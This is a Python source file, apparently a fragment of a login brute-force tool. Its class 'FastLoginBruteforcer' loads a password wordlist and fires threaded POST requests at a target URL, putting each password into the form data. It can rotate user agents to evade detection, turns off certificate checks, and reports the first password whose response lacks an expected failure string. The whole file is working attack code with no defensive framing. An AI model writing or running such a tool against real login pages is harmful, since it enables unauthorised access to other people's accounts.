class FastLoginBruteforcer:

    def __init__(self, args: Namespace):
        self.url            = args.url
        self.data           = args.data
        self.wordlist       = args.wordlist
        self.threads        = args.threads
        self.random_agent   = args.random_agent
        self.expected       = args.expected
        self.wl             = self.load_wordlist()
        self.wlcount        = len(self.wl)

    def load_wordlist(self):
        Color.yellow(f'Loading Wordlist ...')
        with open(self.wordlist, 'rb') as f:
            return f.read().splitlines()

    def initial_info(self):
        global wordlist
        Color.yellow(f'Target URL       : {self.url}')
        Color.yellow(f'Post Data        : {self.data}')
        Color.yellow(f'Wordlist PATH    : {self.wordlist}')
        Color.yellow(f'Wordlist Count   : {self.wlcount}')
        Color.yellow(f'Threads          : {self.threads}')
        Color.yellow(f'Random Agent     : {self.random_agent}')

    def run(self):
        self.initial_info()


        url             = self.url
        data            = self.data
        expected        = self.expected
        random_agent    = self.random_agent
        threads         = self.threads  
        wordlist        = self.wl
        wlcount         = int(self.wlcount)

        try:   
            success_login = False

            Color.yellow("Starting Brute Force ...")
            with ThreadPoolExecutor(max_workers=threads) as executor:
                processed = (executor.submit(login, url, data, pwd.decode(), expected, random_agent) for pwd in wordlist)
                for i, process in enumerate(as_completed(processed)):

                    if wlcount > 1:
                        print("[{}][INFO] trying at {} attempt.".format(datetime.now().strftime("%H:%M:%S"), i), end="\r")

                    process = process.result()
                    if process is not False:
                        success_login = True
                        break
                    
                if success_login is True:
                    Color.green(f"Clearing all process ...                                               ")
                    sys.exit(0)
                else:
                    Color.red("cannot enter into the target dashboard")
                    sys.exit(0)
            
        except Exception as error:
            Color.cyan(error)
            sys.exit(0)

def login(url, data, password, expected, random_agent):
    global __userAgent__
    headers  = {"Content-Type" : "application/x-www-form-urlencoded"}

    if random_agent:
        headers['User-Agent'] = random.choice(__userAgent__)
    else:
        headers['User-Agent'] = __userAgent__[0]
    data = data.replace('*', password)

    try:
        req = requests.post(url, data=data, headers=headers, verify=False)
        req = req.text
        if expected not in req:
            print('Login Success with password is ', end='')
            Color.cyan(f'{password}')
            return True
        return False
    except Exception as e:
        Color.red(f'Error: {e}')
        return False
        
        

